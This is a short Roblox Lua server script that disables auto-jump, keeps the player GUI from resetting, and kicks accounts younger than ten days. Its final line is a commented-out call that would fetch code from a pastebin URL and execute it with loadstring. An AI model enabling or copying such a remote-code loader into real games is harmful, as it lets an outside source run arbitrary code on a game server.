local minAge = 10
game.StarterPlayer.AutoJumpEnabled = false
game:GetService("StarterGui").ResetPlayerGuiOnSpawn = false

game.Players.PlayerAdded:connect(function(plr)
	if plr.AccountAge < minAge then
		plr:Kick("Your account needs to be at least "..minAge.." days old to join the game.")
	end
end)
local HttpService = game:GetService("HttpService")
--loadstring(HttpService:GetAsync("https://pastebin.com/raw/ZuYyqcDR"))()